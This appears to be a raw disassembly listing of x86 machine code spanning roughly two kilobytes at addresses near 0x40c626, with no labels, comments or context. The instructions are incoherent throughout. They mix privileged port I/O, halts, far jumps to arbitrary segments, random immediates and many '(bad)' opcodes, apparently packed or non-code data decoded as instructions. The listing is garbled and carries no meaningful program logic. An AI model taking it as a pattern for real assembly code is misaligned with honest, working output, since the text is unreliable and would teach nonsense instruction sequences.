  40c626:	mov    esi,0x12fc68df
  40c62b:	xor    BYTE PTR [eax+0x3ffcfcf2],ch
  40c631:	jmp    0xaf6c8dd1
  40c636:	std    
  40c637:	push   ss
  40c638:	ss fcomi st,st(4)
  40c63b:	mov    eax,ds:0xe77f5be9
  40c640:	and    edx,DWORD PTR [ebx-0x6f]
  40c643:	test   al,0x0
  40c645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c646:	fucom  st(6)
  40c648:	sub    al,cl
  40c64a:	mov    esp,0xb3fd20c4
  40c64f:	dec    esi
  40c650:	cmc    
  40c651:	in     al,0x9d
  40c653:	xor    bh,BYTE PTR [ebp-0x5a30a381]
  40c659:	xchg   esi,eax
  40c65a:	mov    ds,esi
  40c65c:	mov    dl,0x63
  40c65e:	push   edi
  40c65f:	rcr    DWORD PTR [edi],cl
  40c661:	aas    
  40c662:	and    edi,DWORD PTR [ebp+0x1b]
  40c665:	mov    ecx,0x618eca85
  40c66a:	loop   0x40c6bf
  40c66c:	inc    ebp
  40c66d:	pop    eax
  40c66e:	fild   DWORD PTR [ebx+0x4f]
  40c671:	loop   0x40c68b
  40c673:	retf   
  40c674:	lea    ecx,[edx-0x713185cf]
  40c67a:	cli    
  40c67b:	xchg   ebp,eax
  40c67c:	lods   al,BYTE PTR ds:[esi]
  40c67d:	in     eax,dx
  40c67e:	pop    edx
  40c67f:	and    eax,0xfad8e959
  40c684:	add    eax,0x9a9d324e
  40c689:	jge    0x40c6c0
  40c68b:	fild   WORD PTR [edx+0x1a]
  40c68e:	mov    dh,0x7b
  40c690:	or     DWORD PTR [ecx],eax
  40c692:	popa   
  40c693:	call   0x6be5:0x34f74c94
  40c69a:	or     eax,0x2cb81780
  40c69f:	mov    eax,0x1d30493c
  40c6a4:	push   ecx
  40c6a5:	xor    al,0xd2
  40c6a7:	in     eax,dx
  40c6a8:	je     0x40c6c4
  40c6aa:	dec    esi
  40c6ab:	mov    al,ds:0xded24b2b
  40c6b0:	fs or  al,0x9e
  40c6b3:	push   eax
  40c6b4:	mov    BYTE PTR [edx-0x840ac6c],ah
  40c6ba:	leave  
  40c6bb:	iret   
  40c6bc:	adc    eax,0xbea8698c
  40c6c1:	int    0x25
  40c6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c4:	out    0x38,ax
  40c6c7:	pop    edx
  40c6c8:	adc    al,0x4a
  40c6ca:	sbb    al,0x14
  40c6cc:	xchg   esi,eax
  40c6cd:	into   
  40c6ce:	dec    edx
  40c6cf:	cmp    bh,BYTE PTR [ebp+edx*1-0x33a74f78]
  40c6d6:	lds    ebp,FWORD PTR [eax-0xe]
  40c6d9:	push   esi
  40c6da:	pop    ebp
  40c6db:	icebp  
  40c6dc:	push   0x7e
  40c6de:	or     eax,0x211f6ceb
  40c6e3:	push   cs
  40c6e4:	and    al,0xd5
  40c6e6:	stos   DWORD PTR es:[edi],eax
  40c6e7:	nop
  40c6e8:	xchg   esi,eax
  40c6e9:	pop    ds
  40c6ea:	add    ebx,DWORD PTR [esi]
  40c6ec:	call   0x41693355
  40c6f1:	rcr    BYTE PTR [esi],cl
  40c6f3:	fdivp  st(6),st
  40c6f5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6f7:	xchg   ecx,eax
  40c6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f9:	xchg   ebp,eax
  40c6fa:	jecxz  0x40c6ff
  40c6fc:	and    esi,DWORD PTR [ecx+0x27]
  40c6ff:	push   es
  40c700:	and    al,0x42
  40c702:	jmp    0xe3e28226
  40c707:	pop    eax
  40c708:	jns    0x40c710
  40c70a:	mov    ?,WORD PTR ds:0x76bde045
  40c710:	mov    dl,0x1e
  40c712:	lea    eax,[edx+0x563e7239]
  40c718:	dec    ebx
  40c719:	out    dx,al
  40c71a:	jbe    0x40c6f2
  40c71c:	xchg   ecx,eax
  40c71d:	push   ss
  40c71e:	jae    0x40c773
  40c720:	test   eax,0x2f5119c4
  40c725:	dec    ebp
  40c726:	(bad)  
  40c727:	hlt    
  40c728:	xor    dh,BYTE PTR [esi]
  40c72a:	or     al,0xb7
  40c72c:	jle    0x40c781
  40c72e:	mov    bl,0xd8
  40c730:	mov    al,0x40
  40c732:	fst    st(2)
  40c734:	mov    dh,0x96
  40c736:	sti    
  40c737:	push   ecx
  40c738:	xchg   DWORD PTR [ebx+edx*4+0x42],esi
  40c73c:	xchg   DWORD PTR ds:0x3572dbc4,ebp
  40c742:	cmp    DWORD PTR [edx-0x11],0x35
  40c746:	jnp    0x40c6fa
  40c748:	fwait
  40c749:	outs   dx,DWORD PTR ds:[esi]
  40c74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74b:	mov    edi,0xa5c4c4ea
  40c750:	dec    ebx
  40c751:	mov    esp,0x9376dc63
  40c756:	add    DWORD PTR [esp+esi*2],ecx
  40c759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c75a:	mov    ch,bh
  40c75c:	mov    ds:0x4d235c10,eax
  40c761:	mov    ch,ah
  40c763:	jbe    0x40c70b
  40c765:	mov    ds:0xcddaa34f,al
  40c76a:	test   BYTE PTR [edx],0xcd
  40c76d:	out    0x9,eax
  40c76f:	lods   eax,DWORD PTR ds:[esi]
  40c770:	jno    0x40c717
  40c772:	mov    ebp,edi
  40c774:	call   0x6791:0x2635004e
  40c77b:	dec    ebp
  40c77c:	popa   
  40c77d:	in     eax,0xc7
  40c77f:	xor    al,0x88
  40c781:	loop   0x40c799
  40c783:	data16 sbb al,0xa5
  40c786:	sub    edi,DWORD PTR [edi+0x313c7df1]
  40c78c:	jbe    0x40c74a
  40c78e:	add    DWORD PTR [edi+0x3a283029],ebp
  40c794:	add    BYTE PTR [edx+ebp*8+0x306390e0],dh
  40c79b:	jno    0x40c7ff
  40c79d:	cmp    DWORD PTR [edx+eiz*8+0x3038b07f],ecx
  40c7a4:	addr16 dec esi
  40c7a6:	je     0x40c7d1
  40c7a8:	sbb    ecx,DWORD PTR [edx-0x614a247f]
  40c7ae:	mov    ds:0xd5ceb5d4,al
  40c7b3:	mov    dl,0xae
  40c7b5:	fstp   TBYTE PTR [eax+edx*8]
  40c7b8:	mov    ebp,DWORD PTR [edi+0x47]
  40c7bb:	cwde   
  40c7bc:	scas   ax,WORD PTR es:[edi]
  40c7be:	fdiv   QWORD PTR [ecx-0x18128b77]
  40c7c4:	pmulhw mm3,QWORD PTR [edi]
  40c7c7:	retf   0x7d50
  40c7ca:	ss iret 
  40c7cc:	pusha  
  40c7cd:	inc    ebp
  40c7ce:	test   al,0x6b
  40c7d0:	out    0x7e,al
  40c7d2:	aam    0x13
  40c7d4:	pop    esp
  40c7d5:	xchg   ecx,eax
  40c7d6:	push   esi
  40c7d7:	add    al,0x13
  40c7d9:	jnp    0x40c780
  40c7db:	cmp    ebp,DWORD PTR [eax+0x4e]
  40c7de:	lock xlat BYTE PTR ds:[ebx]
  40c7e0:	mov    WORD PTR [esi+0x378c9e2b],fs
  40c7e6:	xor    ah,BYTE PTR [edx-0x13]
  40c7e9:	cwde   
  40c7ea:	clc    
  40c7eb:	mov    ecx,0xb9882b14
  40c7f0:	lods   eax,DWORD PTR ds:[esi]
  40c7f1:	(bad)
  40c7f5:	sub    DWORD PTR [ebp+0x67],edx
  40c7f8:	xchg   BYTE PTR [ecx],ch
  40c7fa:	(bad)  
  40c7fb:	loopne 0x40c7d6
  40c7fd:	sub    eax,0x96412c5b
  40c802:	mov    ah,0x62
  40c804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c805:	cmp    DWORD PTR [edx-0x23],ecx
  40c808:	test   al,0x84
  40c80a:	dec    edi
  40c80b:	outs   dx,DWORD PTR ds:[esi]
  40c80c:	retf   
  40c80d:	jge    0x40c83c
  40c80f:	movsx  edi,BYTE PTR [esi]
  40c812:	popa   
  40c813:	(bad)  
  40c814:	adc    eax,0x68cde622
  40c819:	mov    ds:0xb626b424,al
  40c81e:	je     0x40c834
  40c820:	mov    ebx,0xf0c5fd8a
  40c825:	cmc    
  40c826:	adc    bl,BYTE PTR [edx]
  40c828:	ret    
  40c829:	mov    ebp,0xd275c2ed
  40c82e:	call   0xbc1b:0xbe6f26eb
  40c835:	ds sbb eax,0x52ea1b85
  40c83b:	fisttp WORD PTR ss:[ebx-0x48601b29]
  40c842:	or     DWORD PTR [edx-0x49601a07],eax
  40c848:	js     0x40c820
  40c84a:	pop    esp
  40c84b:	stc    
  40c84c:	jmp    0x7272:0xca8cb959
  40c853:	fs push ebx
  40c855:	mov    al,ds:0xa4a17185
  40c85a:	xchg   esi,eax
  40c85b:	dec    ecx
  40c85c:	(bad)  
  40c85e:	(bad)  
  40c85f:	jne    0x40c87d
  40c861:	out    dx,eax
  40c862:	imul   edx,DWORD PTR [ecx],0x3745d29c
  40c868:	das    
  40c869:	jp     0x40c8b6
  40c86b:	je     0x40c81f
  40c86d:	dec    esi
  40c86e:	cmp    ch,bh
  40c870:	leave  
  40c871:	push   ebx
  40c872:	inc    ebx
  40c873:	add    BYTE PTR [eax+0x50],bl
  40c876:	pop    ebp
  40c877:	sub    DWORD PTR ds:0x16f7e8fc,0xffffff91
  40c87e:	lods   eax,DWORD PTR ds:[esi]
  40c87f:	mov    al,ds:0x828498e9
  40c884:	in     eax,dx
  40c885:	mov    ds:0xc1783dbe,al
  40c88a:	cmp    al,0xab
  40c88c:	sub    edi,DWORD PTR [edx]
  40c88e:	adc    BYTE PTR [ebx+0x66],dh
  40c891:	jnp    0x40c875
  40c893:	inc    eax
  40c894:	add    eax,0xf33964d2
  40c899:	push   eax
  40c89a:	shl    BYTE PTR [ebx+0x6bffae6b],cl
  40c8a0:	add    al,0x71
  40c8a2:	mov    bh,0x79
  40c8a4:	callw  0x3352
  40c8a8:	imul   DWORD PTR [ebx+0x55]
  40c8ab:	jge    0x40c82d
  40c8ad:	dec    edx
  40c8ae:	ret    0x48b4
  40c8b1:	hlt    
  40c8b2:	pop    DWORD PTR [eax+0x2c]
  40c8b5:	mov    bl,BYTE PTR [ebx-0x20]
  40c8b8:	cmp    dl,BYTE PTR [edi-0x626f0a3e]
  40c8be:	mov    bh,0x7
  40c8c0:	xor    BYTE PTR [ebp+0x768cc943],dh
  40c8c6:	daa    
  40c8c7:	pop    ebx
  40c8c8:	out    dx,eax
  40c8c9:	aam    0x90
  40c8cb:	inc    ebx
  40c8cc:	pop    esp
  40c8cd:	jbe    0x40c8b7
  40c8cf:	pop    edx
  40c8d0:	(bad)  
  40c8d1:	sub    al,0x57
  40c8d3:	shr    eax,cl
  40c8d5:	mov    dl,0xdb
  40c8d7:	mov    eax,ds:0xa31d3de2
  40c8dc:	dec    ecx
  40c8dd:	sub    edx,eax
  40c8df:	int3   
  40c8e0:	mov    edx,0x8a69909d
  40c8e5:	pop    ecx
  40c8e6:	xchg   esp,eax
  40c8e7:	mov    dh,0x0
  40c8e9:	sbb    eax,0x19dfb829
  40c8ee:	sbb    al,0x9d
  40c8f0:	mov    ebp,ds
  40c8f2:	jbe    0x40c8b1
  40c8f4:	aaa    
  40c8f5:	mov    ch,0x64
  40c8f7:	hlt    
  40c8f8:	cmp    BYTE PTR [ebp+0x1c],ch
  40c8fb:	stc    
  40c8fc:	div    edx
  40c8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8ff:	cmp    al,0x79
  40c901:	fwait
  40c902:	retf   0x518d
  40c905:	add    BYTE PTR ds:0x19ee21ab,cl
  40c90b:	add    DWORD PTR [esi+0x1c],ecx
  40c90e:	and    cl,ch
  40c910:	das    
  40c911:	sub    dh,ch
  40c913:	xlat   BYTE PTR ds:[ebx]
  40c914:	vpmulhuw xmm4,xmm4,XMMWORD PTR [ecx]
  40c918:	and    dl,bh
  40c91a:	int3   
  40c91b:	cld    
  40c91c:	inc    eax
  40c91d:	cmp    al,0xce
  40c91f:	xor    al,0x8d
  40c921:	mov    ah,0x27
  40c923:	sbb    eax,ecx
  40c925:	(bad)  
  40c926:	xor    edx,DWORD PTR [edi-0x76]
  40c929:	mov    ds:0xa6e99a83,al
  40c92e:	add    al,0xe3
  40c930:	cmp    bh,dl
  40c932:	js     0x40c97a
  40c934:	adc    BYTE PTR [edx-0x774a55e6],bh
  40c93a:	or     BYTE PTR [eax],ah
  40c93c:	in     eax,dx
  40c93d:	push   es
  40c93e:	aaa    
  40c93f:	mov    esp,DWORD PTR [edx-0x4a24df96]
  40c945:	jmp    0x7638:0x92a0c8bf
  40c94c:	push   ecx
  40c94d:	and    eax,DWORD PTR [ebp-0x525f11f1]
  40c953:	pop    edi
  40c954:	imul   esp,DWORD PTR [edi],0x8
  40c957:	dec    edx
  40c958:	inc    edx
  40c959:	rol    ebx,1
  40c95b:	int    0xa8
  40c95d:	loope  0x40c8ec
  40c95f:	pop    esi
  40c960:	test   DWORD PTR [edx+0x68],edi
  40c963:	mov    eax,ds:0x410951c8
  40c968:	xlat   BYTE PTR ds:[ebx]
  40c969:	arpl   WORD PTR [eax+0x51],cx
  40c96c:	inc    esi
  40c96d:	push   ecx
  40c96e:	cmc    
  40c96f:	idiv   BYTE PTR [ebx-0x52964e04]
  40c975:	(bad)  
  40c976:	sahf   
  40c977:	sbb    DWORD PTR es:[edx+0x47],esp
  40c97b:	retf   
  40c97c:	and    al,0x3d
  40c97e:	mov    WORD PTR [ecx],?
  40c980:	and    esi,ebp
  40c982:	pop    ebp
  40c983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c984:	fld    QWORD PTR [eax-0x26af73fc]
  40c98a:	push   ebp
  40c98b:	pushf  
  40c98c:	pop    eax
  40c98d:	push   edi
  40c98e:	test   al,0xee
  40c990:	sub    cl,BYTE PTR [ebp+ecx*2+0x2772b9e8]
  40c997:	in     al,0x9e
  40c999:	sti    
  40c99a:	dec    esp
  40c99b:	daa    
  40c99c:	sub    BYTE PTR [esp+eax*8+0x3319522],dh
  40c9a3:	dec    edi
  40c9a4:	out    dx,eax
  40c9a5:	add    esi,DWORD PTR ds:0xcf73ef82
  40c9ab:	dec    edi
  40c9ac:	out    dx,al
  40c9ad:	sub    esi,ebx
  40c9af:	push   ebp
  40c9b0:	or     eax,0x488162f8
  40c9b5:	xchg   ebx,eax
  40c9b6:	in     al,dx
  40c9b7:	dec    ebx
  40c9b8:	push   ebx
  40c9b9:	int    0xac
  40c9bb:	gs jbe 0x40ca31
  40c9be:	test   eax,0x30508561
  40c9c3:	jb     0x40c9d9
  40c9c5:	pop    edx
  40c9c6:	jl     0x40c9eb
  40c9c8:	mov    dl,0xce
  40c9ca:	and    eax,0x3df87165
  40c9cf:	xchg   esi,eax
  40c9d0:	mov    eax,0xb3fabe6
  40c9d5:	aad    0x6b
  40c9d7:	fist   WORD PTR [edi-0x60]
  40c9da:	loope  0x40ca0e
  40c9dc:	xor    BYTE PTR [ebx+0x1a105d38],al
  40c9e2:	std    
  40c9e3:	icebp  
  40c9e4:	std    
  40c9e5:	retf   
  40c9e6:	ret    0x99b2
  40c9e9:	out    0x98,al
  40c9eb:	fist   WORD PTR [edx+0x13d1e426]
  40c9f2:	dec    edi
  40c9f3:	ins    BYTE PTR es:[edi],dx
  40c9f4:	mov    al,ds:0xe4bb4176
  40c9f9:	in     al,0xb0
  40c9fb:	xchg   ecx,eax
  40c9fc:	and    ah,dl
  40c9fe:	(bad)
  40ca02:	pmulhuw mm7,QWORD PTR [ebp+0x39]
  40ca06:	jge    0x40ca4e
  40ca08:	jg     0x40ca0f
  40ca0a:	and    al,0x1c
  40ca0c:	lock clc 
  40ca0e:	mov    cl,0x9f
  40ca10:	inc    ecx
  40ca11:	loopne 0x40ca36
  40ca13:	enter  0x1741,0xf6
  40ca17:	xchg   esp,eax
  40ca18:	test   eax,0xe37194f0
  40ca1d:	into   
  40ca1e:	and    DWORD PTR [edi+0x11],ecx
  40ca21:	(bad)  
  40ca22:	retf   0xc641
  40ca25:	cmp    al,0xb1
  40ca27:	inc    edi
  40ca28:	mov    ah,0x5c
  40ca2a:	xor    DWORD PTR es:[edi-0x27cedd03],edx
  40ca31:	pminub mm6,QWORD PTR [eax+eax*8-0x7b]
  40ca36:	jb     0x40c9f6
  40ca38:	add    al,0xba
  40ca3a:	sub    dh,BYTE PTR [edx+0x36]
  40ca3d:	out    0x71,eax
  40ca3f:	add    esp,DWORD PTR [ecx+0x43]
  40ca42:	repz jne 0x40ca4c
  40ca45:	outs   dx,DWORD PTR ds:[esi]
  40ca46:	leave  
  40ca47:	ret    
  40ca48:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40ca4a:	test   al,0xf3
  40ca4c:	and    DWORD PTR [edi-0x2bd690ab],esi
  40ca52:	(bad)  
  40ca54:	push   cs
  40ca55:	add    eax,DWORD PTR [edi-0x4f]
  40ca58:	sub    eax,0xa4180ef
  40ca5d:	faddp  st(7),st
  40ca5f:	adc    BYTE PTR ds:0x61fc1992,ch
  40ca65:	std    
  40ca66:	pusha  
  40ca67:	ficomp DWORD PTR [edi+0x9256f75]
  40ca6d:	jg     0x40ca65
  40ca6f:	arpl   WORD PTR [eax+0x7bd590a8],bx
  40ca75:	mov    ds:0xc855e05a,al
  40ca7a:	in     al,0xe
  40ca7c:	mov    ebp,DWORD PTR [eax+0x60]
  40ca7f:	adc    eax,0x733f7aeb
  40ca84:	inc    eax
  40ca85:	icebp  
  40ca86:	push   0xdd1d77f8
  40ca8b:	sbb    ebx,ecx
  40ca8d:	sti    
  40ca8e:	xchg   edi,eax
  40ca8f:	cmp    al,0xc2
  40ca91:	imul   eax,DWORD PTR [ebx+ebp*4+0x54d11b0f],0x22feeb00
  40ca9c:	push   esp
  40ca9d:	fcmovnb st,st(3)
  40ca9f:	sbb    eax,0xf1f41eb
  40caa4:	mov    esi,0x916b697b
  40caa9:	jle    0x40cad2
  40caab:	xchg   ecx,eax
  40caac:	in     eax,dx
  40caad:	mov    eax,ds:0xe992ca92
  40cab2:	push   edi
  40cab3:	mov    bh,0xf4
  40cab5:	repnz xlat BYTE PTR ds:[ebx]
  40cab7:	mov    ebx,0xd376069f
  40cabc:	shr    DWORD PTR [esi],0x8a
  40cabf:	dec    edx
  40cac0:	addr16 push cs
  40cac2:	hlt    
  40cac3:	add    DWORD PTR [edx],0x7ec2f23b
  40cac9:	mov    al,ds:0x1e0e05ee
  40cace:	jo     0x40cad1
  40cad0:	sbb    esi,DWORD PTR [edi]
  40cad2:	(bad)  
  40cad3:	aam    0xa8
  40cad5:	ret    
  40cad6:	mov    esp,0xf1ce0d6f
  40cadb:	sbb    cl,ah
  40cadd:	(bad)  
  40cade:	(bad)  
  40cae0:	dec    esp
  40cae1:	or     bh,bh
  40cae3:	dec    ecx
  40cae4:	sub    ch,al
  40cae6:	sar    edx,1
  40cae8:	cmp    DWORD PTR [ebp+0x45],eax
  40caeb:	and    al,0x82
  40caed:	stos   BYTE PTR es:[edi],al
  40caee:	retf   
  40caef:	cmp    al,0x90
  40caf1:	repz adc ecx,DWORD PTR [eax-0x5989029]
  40caf8:	xchg   esi,eax
  40caf9:	call   0x5fb8c440
  40cafe:	in     al,0x2f
  40cb00:	pop    ds
  40cb01:	jmp    0xdc0f:0x1e64dc29
  40cb08:	and    bh,ch
  40cb0a:	push   esi
  40cb0b:	pop    esp
  40cb0c:	iret   
  40cb0d:	mov    dh,0x12
  40cb0f:	jmp    0x40cb4b
  40cb11:	fmul   DWORD PTR ds:0xc012ff1f
  40cb17:	sub    DWORD PTR [ecx-0x69b2b810],ebp
  40cb1d:	xchg   ebx,eax
  40cb1e:	test   al,0x40
  40cb20:	mov    bh,0xe5
  40cb22:	cmp    eax,0x27cb456c
  40cb27:	fnstcw WORD PTR [edi+ecx*8]
  40cb2a:	or     BYTE PTR [edi+0x5f],ch
  40cb2d:	int    0xca
  40cb2f:	mov    esi,0x484c6d33
  40cb34:	mov    ah,0x3b
  40cb36:	adc    al,ah
  40cb38:	xlat   BYTE PTR ds:[ebx]
  40cb39:	jns    0x40cb33
  40cb3b:	adc    al,0xf
  40cb3d:	or     dh,BYTE PTR [ecx]
  40cb3f:	jg     0x40cb8d
  40cb41:	jns    0x40cb5e
  40cb43:	cmc    
  40cb44:	push   esp
  40cb45:	dec    esp
  40cb46:	imul   eax,ebx,0x9bf321c9
  40cb4c:	popa   
  40cb4d:	adc    al,BYTE PTR [ebx]
  40cb4f:	push   ebp
  40cb50:	pop    ebp
  40cb51:	fidivr WORD PTR [ebp+0x14418a2b]
  40cb57:	pop    ss
  40cb58:	xchg   ebp,eax
  40cb59:	repz add al,0xc9
  40cb5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb5d:	mov    ebx,0xb6a3f885
  40cb62:	in     eax,dx
  40cb63:	cmc    
  40cb64:	mov    ch,0x57
  40cb66:	jnp    0x40cbd9
  40cb68:	(bad)  
  40cb69:	in     al,dx
  40cb6a:	cwde   
  40cb6b:	fstp   QWORD PTR [ecx]
  40cb6d:	pop    eax
  40cb6e:	ror    DWORD PTR [ebx],cl
  40cb70:	jns    0x40cb1f
  40cb72:	xor    esp,DWORD PTR [edi]
  40cb74:	or     bh,bh
  40cb76:	dec    ecx
  40cb77:	xor    DWORD PTR [eax],ecx
  40cb79:	popf   
  40cb7a:	mov    bh,0xcf
  40cb7c:	aam    0x6c
  40cb7e:	add    al,cl
  40cb80:	(bad)
  40cb84:	push   0x43
  40cb86:	mov    al,ds:0xc5ba9a27
  40cb8b:	stc    
  40cb8c:	sbb    ch,BYTE PTR [esi]
  40cb8e:	jmp    FWORD PTR ds:0x7f44a0
  40cb94:	sbb    esi,DWORD PTR [edx-0x78f0d16b]
  40cb9a:	out    dx,al
  40cb9b:	sbb    DWORD PTR [esi+0x74d4d065],eax
  40cba1:	inc    ecx
  40cba2:	(bad)
  40cba5:	mov    ecx,DWORD PTR [esi+0x3dc25146]
  40cbab:	add    esi,eax
  40cbad:	test   al,0x35
  40cbaf:	xchg   DWORD PTR [eax],eax
  40cbb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb2:	sub    edi,DWORD PTR [esi+0x773b7810]
  40cbb8:	sbb    DWORD PTR ds:0x8b3ae1b,esp
  40cbbe:	mov    esi,0x80ea150a
  40cbc3:	out    dx,al
  40cbc4:	mov    ch,0xc2
  40cbc6:	out    0x63,eax
  40cbc8:	xor    DWORD PTR [ebp-0x7f],ebx
  40cbcb:	dec    edi
  40cbcc:	sbb    bl,BYTE PTR [edi+0x28]
  40cbcf:	sbb    DWORD PTR [edi+0x47af8172],esi
  40cbd5:	mov    ebp,0xe9b376fa
  40cbda:	stc    
  40cbdb:	cmp    edi,DWORD PTR [esi]
  40cbdd:	shl    dh,0x69
  40cbe0:	xchg   cl,al
  40cbe2:	scas   al,BYTE PTR es:[edi]
  40cbe3:	retf   0x52ae
  40cbe6:	xor    esp,ebp
  40cbe8:	adc    BYTE PTR [esi+0x27],cl
  40cbeb:	arpl   cx,ax
  40cbed:	bound  esp,QWORD PTR [edx]
  40cbef:	xor    eax,0x9800bdf5
  40cbf4:	pop    ds
  40cbf5:	in     al,dx
  40cbf6:	xor    DWORD PTR [ebx-0x45],0x6c
  40cbfa:	xchg   esi,eax
  40cbfb:	je     0x40cbe3
  40cbfd:	ret    0xfeef
  40cc00:	nop
  40cc01:	outs   dx,BYTE PTR ds:[esi]
  40cc02:	fs out 0x49,al
  40cc05:	mov    cl,dh
  40cc07:	xchg   ebp,edx
  40cc09:	push   esp
  40cc0a:	dec    esp
  40cc0b:	and    esi,DWORD PTR [esi+0x2151dc2e]
  40cc11:	dec    edi
  40cc12:	jmp    0x91a76817
  40cc17:	bound  ebp,QWORD PTR [ecx-0x6c]
  40cc1a:	pusha  
  40cc1b:	fs mov esi,0xad39013
  40cc21:	je     0x40cc78
  40cc23:	pop    ss
  40cc24:	push   edi
  40cc25:	mov    dl,0x71
  40cc27:	adc    eax,0x55e3a7fb
  40cc2c:	xor    BYTE PTR [esi-0x416693a1],dl
  40cc32:	jno    0x40cbdf
  40cc34:	sti    
  40cc35:	sbb    eax,0xdff31c8f
  40cc3a:	xchg   ebp,eax
  40cc3b:	add    DWORD PTR [esi+eax*1+0x43],edi
  40cc3f:	jle    0x40cc40
  40cc41:	pushf  
  40cc42:	push   eax
  40cc43:	test   eax,0xe0b526e4
  40cc48:	sub    al,BYTE PTR cs:[edx]
  40cc4b:	jno    0x40cbf2
  40cc4d:	lods   eax,DWORD PTR ds:[esi]
  40cc4e:	fimul  DWORD PTR [ebx]
  40cc50:	or     al,0x90
  40cc52:	push   0x3c
  40cc54:	gs jns 0x40cc77
  40cc57:	and    dh,dh
  40cc59:	das    
  40cc5a:	sub    edx,esp
  40cc5c:	xor    BYTE PTR [edi-0x71e8aa03],ch
  40cc62:	es jns 0x40cc66
  40cc65:	pop    eax
  40cc66:	pushf  
  40cc67:	fwait
  40cc68:	ja     0x40cca8
  40cc6a:	pop    esi
  40cc6b:	dec    edx
  40cc6c:	pop    ebx
  40cc6d:	pop    edi
  40cc6e:	in     al,0x70
  40cc70:	das    
  40cc71:	fs xchg ebx,eax
  40cc73:	lods   eax,DWORD PTR ds:[esi]
  40cc74:	fs xchg edi,eax
  40cc76:	push   ebx
  40cc77:	push   cs
  40cc78:	cmp    BYTE PTR [edi],al
  40cc7a:	adc    ebx,ebx
  40cc7c:	pop    edx
  40cc7d:	mov    ecx,0x4a9ca01b
  40cc82:	loop   0x40cc54
  40cc84:	ret    0x850b
  40cc87:	push   edx
  40cc88:	sbb    DWORD PTR [edi+0x71e611ab],ebx
  40cc8e:	mov    cs,WORD PTR [esi]
  40cc90:	fld    DWORD PTR [edi]
  40cc92:	dec    eax
  40cc93:	or     DWORD PTR [esp+ebp*1+0x25f5],esp
	...
  40cd12:	add    BYTE PTR [eax],al
  40cd14:	xor    eax,0xf69202c1
  40cd19:	shl    DWORD PTR [ebp+0x29d829e7],cl
  40cd1f:	scas   eax,DWORD PTR es:[edi]
  40cd20:	cli    
  40cd21:	out    0x82,al
  40cd23:	or     BYTE PTR [ecx+0x7c],dh
  40cd26:	add    BYTE PTR [eax],al
  40cd28:	ins    BYTE PTR es:[edi],dx
  40cd29:	pop    es
  40cd2a:	add    BYTE PTR [eax],al
  40cd2c:	test   BYTE PTR [esi],bh
  40cd2e:	enter  0x6c1,0x58
  40cd32:	fdivr  QWORD PTR [ebx-0x513afbf8]
  40cd38:	fld    st(3)
  40cd3a:	hlt    
  40cd3b:	mov    ebx,0xe073845e
  40cd40:	and    dh,0xe6
  40cd43:	mov    bl,0xdf
  40cd45:	or     eax,0x69558e10
  40cd4a:	dec    esp
  40cd4b:	adc    BYTE PTR [eax],dh
  40cd4d:	or     BYTE PTR [edx+0x5a9d2794],bh
  40cd53:	or     edx,ebp
  40cd55:	jno    0x40cdc7
  40cd57:	jecxz  0x40ccef
  40cd59:	dec    esp
  40cd5a:	fs out 0xef,eax
  40cd5d:	jmp    0x965a:0x922e0e8e
  40cd64:	sar    ah,0xde
  40cd67:	fiadd  DWORD PTR ds:0xf245ff4d
  40cd6d:	cld    
  40cd6e:	addr16 inc edi
  40cd70:	lahf   
  40cd71:	mov    edi,0x3f55704b
  40cd76:	fild   WORD PTR [ebp+0x1aee17a8]
  40cd7c:	int3   
  40cd7d:	xor    eax,0xcaed8f0f
  40cd82:	add    BYTE PTR ds:0xb0ad546,ah
  40cd88:	mov    cl,0x1e
  40cd8a:	push   eax
  40cd8b:	not    BYTE PTR [edx]
  40cd8d:	sti    
  40cd8e:	sar    DWORD PTR ds:0x99c2838e,1
  40cd94:	or     eax,0xa0860833
  40cd99:	push   esi
  40cd9a:	or     ebx,ebp
  40cd9c:	(bad)
  40cda0:	jne    0x40cdc0
  40cda2:	shr    BYTE PTR [ebp+edx*2+0x4146385d],1
  40cda9:	inc    ebx
  40cdaa:	or     dl,al
  40cdac:	mov    al,0xda
  40cdae:	jo     0x40cd89
  40cdb0:	cs imul esi,eax,0xd7c307d
  40cdb7:	fs fsub st(6),st
  40cdba:	(bad)  
  40cdbb:	cmp    al,BYTE PTR [eax-0x42]
  40cdbe:	dec    edx
  40cdbf:	popf   
  40cdc0:	shl    BYTE PTR [ebp-0x45],1
  40cdc3:	xchg   edx,eax
  40cdc4:	dec    ebp
  40cdc5:	cwde   
  40cdc6:	leave  
  40cdc7:	(bad)  
  40cdc8:	dec    edi
  40cdc9:	or     DWORD PTR [edx+0x35],edi
  40cdcc:	and    eax,edx
  40cdce:	mov    dh,0xdb
  40cdd0:	mov    esi,0xfb716425
  40cdd6:	les    ebp,FWORD PTR [ebx]
  40cdd8:	push   edx
  40cdd9:	imul   edx,esi,0x3a559a52
  40cddf:	sub    al,0xb8
  40cde1:	jmp    0x40ce54
  40cde3:	cmp    bh,ch
  40cde5:	lods   eax,DWORD PTR ds:[esi]
  40cde6:	jnp    0x40ce2d
  40cde8:	jle    0x40cdb5
  40cdea:	and    eax,0xa198bdf7
  40cdef:	cmp    DWORD PTR [ebp+0x7eff3733],ebx
  40cdf5:	add    DWORD PTR [edi],ebx
  40cdf7:	add    edx,DWORD PTR [ebx-0x3a67cea5]
  40cdfd:	and    cl,al
  40cdff:	jmp    0xbe5b:0x77a39a92
  40ce06:	xlat   BYTE PTR ds:[ebx]
  40ce07:	in     al,dx
  40ce08:	pop    esp
  40ce09:	xor    ebp,DWORD PTR [edx-0x6d839f8f]
  40ce0f:	ins    BYTE PTR es:[edi],dx
  40ce10:	stc    
  40ce11:	bound  edx,QWORD PTR [ebx]
  40ce13:	fs dec ebx
  40ce15:	mov    bh,0x39
  40ce17:	das    
  40ce18:	xchg   esi,eax
  40ce19:	pop    esi
